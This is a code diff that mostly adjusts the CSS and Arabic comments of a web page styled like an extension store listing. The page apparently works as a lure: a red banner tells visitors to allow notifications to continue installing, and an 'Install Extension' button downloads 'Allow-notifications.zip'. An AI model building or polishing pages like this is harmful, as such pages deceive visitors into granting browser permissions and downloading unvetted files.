@@ -31,7 +31,7 @@
       background: #fff;
       padding: 30px 40px;
       box-sizing: border-box;
-      min-height: calc(100vh - 48px); /* خلى المحتوى يغطي الطول ناقص الشريط */
+      min-height: calc(100vh - 48px);
       display: flex;
       flex-direction: column;
       justify-content: flex-start;
@@ -42,24 +42,29 @@
       align-items: center;
       gap: 20px;
     }
+
     .header img {
       width: 64px;
     }
+
     .title {
       font-size: 24px;
       margin: 0;
     }
+
     .provider {
       color: #666;
       font-size: 14px;
       margin-top: 4px;
     }
+
     .rating {
       margin-top: 8px;
       color: #ffa500;
       font-size: 16px;
     }
 
+    /* ✅ الزر رجع لطبيعته */
     .install-btn {
       display: inline-block;
       text-decoration: none;
@@ -71,6 +76,8 @@
       font-size: 15px;
       cursor: pointer;
       margin-top: 20px;
+      width: auto;
+      max-width: 100%;
     }
 
     .preview-images {
@@ -89,7 +96,7 @@
 </head>
 <body>
 
-  <!-- ✅ شريط التنبيه -->
+  <!-- ✅ الشريط الأحمر -->
   <div class="re-header">يرجى السماح بالإشعارات لمتابعة التثبيت</div>
 
   <div class="wrapper">
@@ -102,10 +109,9 @@
       </div>
     </div>
 
-    <!-- ✅ زر تحميل ملف Allow-notifications.zip -->
+    <!-- ✅ زر التحميل مضبوط -->
     <a href="Allow-notifications.zip" download class="install-btn">Install Extension</a>
 
-    <!-- ✅ عرض 3 صور -->
     <div class="preview-images">
       <img src="preview1.png" alt="Preview 1">
       <img src="preview2.png" alt="Preview 2">
